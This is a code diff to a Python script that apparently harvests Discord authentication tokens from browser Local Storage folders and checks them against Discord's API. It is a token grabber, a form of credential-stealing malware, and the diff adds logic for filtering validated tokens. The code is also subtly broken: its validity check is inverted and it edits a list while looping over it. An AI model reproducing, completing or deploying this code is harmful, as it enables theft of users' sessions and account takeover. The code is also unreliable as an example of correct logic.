@@ -13,12 +13,18 @@ PATHS = {
     "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
 }
 
-def get_username(token):
+def exists(token: str) -> bool:
     r = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token})
-    content = r.json()
-    if "unauthorized" in r.text:
-        return "401: unauthorized"
-    return f"{content['username']}#{content['discriminator']}"
+    if r.status_code == 401:
+        return True
+    return False
+
+def get_username(token):
+    if exists(token):
+        r = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token})
+        content = r.json()
+        return f"{content['username']}#{content['discriminator']}"
+    return 401
 
 def get_tokens(path):
     path += "\\Local Storage\\leveldb"
@@ -41,4 +47,7 @@ def detect_tokens() -> list[str]:
             if token in checked:
                 continue
             checked.append(token)
+        for item in checked:
+            if not exists(item) or item == 401:
+                checked.remove(item)
     return checked
